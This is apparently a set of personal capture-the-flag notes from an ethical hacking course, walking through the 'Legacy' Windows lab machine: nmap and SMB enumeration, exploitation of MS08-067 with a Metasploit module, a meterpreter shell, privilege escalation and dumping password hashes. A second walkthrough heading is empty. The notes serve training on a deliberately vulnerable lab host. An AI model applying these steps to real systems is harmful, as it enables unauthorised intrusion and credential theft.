
<head>
<link rel="stylesheet" href="css/retro.css">
</head>

## Misc Writeups
----
### Summary

All systems covered in the section 12 'Mid-Course Capstone' (https://www.udemy.com/course/practical-ethical-hacking/learn/lecture/17398048#content)

----
#### Walkthrough - Legacy (Windows)
* nmap -A -T4 -p- 10.10.10.4
    * ports 139/145 are open (SMB)
* smbclient -L \\\\10.01.10.4\\ 
    * no connection
* msfconsole
    * search smb_version
    * use auxiliary/scanner/smb/smb_version
        * options: set rhosts 10.10.10.4
        * run / exploit
* Google 'smb windows xp sp3 exploit' 
    * https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
* msfconsole 
    * use exploit/windows/smb/ms08_067_netapi
        * options: set rhosts 10.10.10.4
        * run
    * meterpreter shell
        * getuid
        * getsystem (priv escalation if not su)
        * hashdump (get be cracked offiline)
        * get CTFs     
---
####   Walkthrough - Lame ()


---

---
